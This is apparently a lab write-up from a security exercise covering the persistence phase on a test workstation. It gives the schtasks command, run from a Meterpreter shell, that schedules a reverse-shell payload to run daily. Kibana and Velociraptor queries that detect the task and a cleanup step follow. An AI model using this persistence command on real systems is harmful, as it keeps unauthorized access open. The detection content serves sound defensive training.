# Phase 3: Persistence – Scheduled Task on WS1 (and Note on WS2)

## 1. Objective

After gaining initial access to WS1 via a reverse shell, the attacker establishes persistence to ensure continued access after reboot or session termination. A scheduled task named **“Updater”** is created to execute the reverse shell payload (`C:\Users\Public\shell.exe`) daily at 09:00.

### WS2 Note

WS2 (`192.168.1.30`) is a domain-joined developer workstation. It was **not targeted manually** in this phase and remained unaffected by scheduled task persistence. Although Caldera agents were deployed for automated simulation, no persistence activity was performed manually on WS2.

---

### MITRE ATT&CK Mapping

- **Tactic:** TA0003 – Persistence  
- **Technique:** T1053.005 – Scheduled Task  

---

## 2. Attack Execution

All commands were executed from WS1 (`192.168.1.20`) via Meterpreter or system shell after initial access.

---

### 2.1 Create Scheduled Task

From Meterpreter:

```text
meterpreter > shell
```

Then on Windows shell:

```cmd
schtasks /create /tn "Updater" /tr "C:\Users\Public\shell.exe" /sc daily /st 09:00 /f
```

---

### Parameter Explanation

- `/create` → Create new task  
- `/tn "Updater"` → Task name  
- `/tr` → Executable path (payload)  
- `/sc daily` → Run daily  
- `/st 09:00` → Start time  
- `/f` → Force overwrite if exists  

---

### 2.2 Expected Output

```text
SUCCESS: The scheduled task "Updater" was successfully created.
```

---

### 2.3 Verify Task

```cmd
schtasks /query /tn "Updater"
```

Expected output:

```text
TaskName   Next Run Time        Status
Updater    09:00:00            Ready
```

---

## 3. Detection in Kibana

Scheduled task creation is logged as Windows Event ID 4698 and collected via Winlogbeat.

---

### 3.1 Kibana Query

```text
winlog.event_id: 4698 AND winlog.event_data.TaskName: Updater
```

---

### 3.2 Example Event Fields

| Field | Value |
|------|------|
| Event ID | 4698 |
| Task Name | Updater |
| Task Content | C:\Users\Public\shell.exe |
| User | NATION\Administrator |
| Host | WS1 |

---

### 3.3 Process Creation (schtasks)

```text
winlog.event_id: 4688 AND process.executable: *schtasks.exe AND process.command_line: *Updater*
```

---

## 4. Detection Rules (Kibana Alerting)

---

### Rule 1 – Suspicious Task Name

- **Name:** Persistence – Task “Updater”  
- **Index:** winlogbeat-*  
- **Query:**
```text
winlog.event_id: 4698 AND winlog.event_data.TaskName: Updater
```
- **Schedule:** Every 5 minutes  
- **Threshold:** > 0  

---

### Rule 2 – Public Directory Execution

- **Name:** Persistence – Execution from Public Folder  
- **Index:** winlogbeat-*  
- **Query:**
```text
winlog.event_id: 4698 AND winlog.event_data.TaskContent: *Users\Public*
```

---

## 5. Velociraptor Hunting

### Artifact Used
- `Windows.Sys.ScheduledTasks`

### Query

```sql
SELECT * FROM hunt_results()
WHERE Name =~ '(?i)Updater'
```

### Findings

- WS1 → Task “Updater” present  
- WS2 → No scheduled task found (expected)

---

## 6. Cleanup (Optional)

```cmd
schtasks /delete /tn "Updater" /f
```

---

## 7. Screenshot Checklist

Capture:

- Meterpreter shell showing `schtasks /create` success  
- Kibana event ID 4698 showing task creation  
- Velociraptor results showing task only on WS1  

---

## 8. Troubleshooting

| Issue | Cause | Fix |
|------|------|-----|
| Access denied | Not SYSTEM | Escalate privileges |
| Task not running | Missing payload | Verify file path |
| No event 4698 | Audit disabled | Enable auditing |
| Task appears on WS2 | Misconfiguration | Remove manually |

---

## 9. Conclusion

The persistence phase successfully established a scheduled task on WS1 that ensures recurring execution of the reverse shell payload. The activity was detected via Event ID 4698 and fully visible in Kibana.

Velociraptor confirmed persistence only on WS1, while WS2 remained unaffected, validating controlled execution of the attack chain.